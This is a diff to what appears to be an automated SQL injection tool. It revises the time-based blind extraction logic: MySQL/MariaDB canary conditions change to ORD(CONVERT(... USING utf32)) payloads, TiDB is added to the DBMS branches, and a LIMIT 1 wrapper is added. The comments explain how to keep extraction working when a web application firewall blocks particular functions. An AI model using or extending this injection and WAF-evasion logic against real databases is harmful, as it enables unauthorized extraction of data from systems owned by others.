@@ -145142,8 +145142,8 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # 'A' passes but version()/current_catalog may be blocked separately.
             if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                 _canary_cond = f"ASCII({substr}(current_catalog,1,1))>0"
-            elif dbms in ("MySQL", "MariaDB"):
-                # BUG-V163-TBEXTRACT-MYSQL-CANARY FIX (HIGH, MySQL/MariaDB;
+            elif dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-V163-TBEXTRACT-MYSQL-CANARY FIX (HIGH, MySQL/MariaDB/TiDB;
                 # _time_based_extract_inner; T/TH/HQ techniques; all surfaces):
                 # The previous canary used ASCII({substr}(@@version,1,1))>0 even though
                 # _ascii_func was set to "ORD" for MySQL/MariaDB (BUG-V161-TBEXTRACT-MYSQL-ORD
@@ -145156,9 +145156,15 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 #   - If WAF blocks ASCII() but not ORD(): canary fails unnecessarily,
                 #     falls through to EBF when standard ORD() extraction would work fine,
                 #     spending 50-150 extra calibration probes needlessly.
-                # Fix: use ORD({substr}(@@version,1,1))>0 to match the actual _ascii_func.
+                # Fix: use ORD(CONVERT(...USING utf32))>0 to exactly match the extraction
+                # form (FIX-MYSQL-ORD-UTF32 at line ~145991 wraps SUBSTRING in CONVERT
+                # USING utf32 so ORD() returns the true Unicode code point).  A WAF that
+                # blocks CONVERT(...USING utf32) will block every extraction probe but not
+                # this simplified canary — causing the canary to pass while extraction is
+                # entirely blocked, producing silent chr(0)/empty output for all positions.
+                # Also include TiDB — it uses the identical ORD(CONVERT...utf32) form.
                 # Numeric safety: ORD() returns a plain integer; >0 is an integer comparison.
-                _canary_cond = f"ORD({substr}(@@version,1,1))>0"
+                _canary_cond = f"ORD(CONVERT({substr}(@@version,1,1) USING utf32))>0"
             elif dbms in ("MSSQL",):
                 # BUG-V169-TBEXTRACT-MSSQL-CANARY-ASCII-NOT-UNICODE FIX (MEDIUM; MSSQL;
                 # _time_based_extract_inner; T/TH/HQ techniques; all surfaces; all HTTP methods):
@@ -145219,7 +145225,13 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                         "LENGTH('AB')>1",
                         "LENGTH(current_database())>0",
                     ]
-                elif dbms in ("MySQL", "MariaDB"):
+                elif dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-TIDB-SIMPLE-CANARY FIX: TiDB uses the same MySQL-compatible
+                    # @@version global and LENGTH() function. The previous guard only
+                    # covered ("MySQL", "MariaDB"), so TiDB fell through to the generic
+                    # else branch ["1=1", "2>1"] — omitting LENGTH(@@version)>0 which
+                    # provides a database-server-access proof that pure-literal canaries
+                    # do not.  Consistent with all other MySQL/MariaDB/TiDB guards.
                     _simple_canaries = [
                         "1=1",
                         "2>1",
@@ -145355,11 +145367,13 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     # ASCII(SUBSTRING('A',1,1))>64 is always TRUE, no DB access needed.
                     if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                         _canary_cond = f"ASCII({substr}(current_catalog,1,1))>0"
-                    elif dbms in ("MySQL", "MariaDB"):
+                    elif dbms in ("MySQL", "MariaDB", "TiDB"):
                         # BUG-V163-TBEXTRACT-MYSQL-CANARY FIX (second occurrence in EBF loop):
-                        # Same root cause as the first occurrence above — use ORD() to match
-                        # the actual _ascii_func dispatched for MySQL/MariaDB.
-                        _canary_cond = f"ORD({substr}(@@version,1,1))>0"
+                        # Same root cause as the first occurrence above — use ORD(CONVERT(
+                        # ...USING utf32)) to exactly match the extraction form so a WAF that
+                        # blocks CONVERT...USING utf32 fails the canary rather than silently
+                        # producing garbage output. TiDB added here (uses identical form).
+                        _canary_cond = f"ORD(CONVERT({substr}(@@version,1,1) USING utf32))>0"
                     elif dbms in ("MSSQL",):
                         # BUG-V169-TBEXTRACT-MSSQL-CANARY-ASCII-NOT-UNICODE FIX (second occurrence):
                         # Same root cause as the first occurrence above — EBF strategy loop
@@ -150462,7 +150476,8 @@ class ExtractionOrchestrator:
             """
             q = q.strip().rstrip(';')
             qu = q.upper()
-            if dbms in ("MySQL", "MariaDB"):
+            if dbms in ("MySQL", "MariaDB", "TiDB"):
+                # TiDB is MySQL-wire-compatible: LIMIT 1 is the correct single-row limiter.
                 if 'LIMIT ' not in qu:
                     return f"({q} LIMIT 1)"
                 return f"({q})"
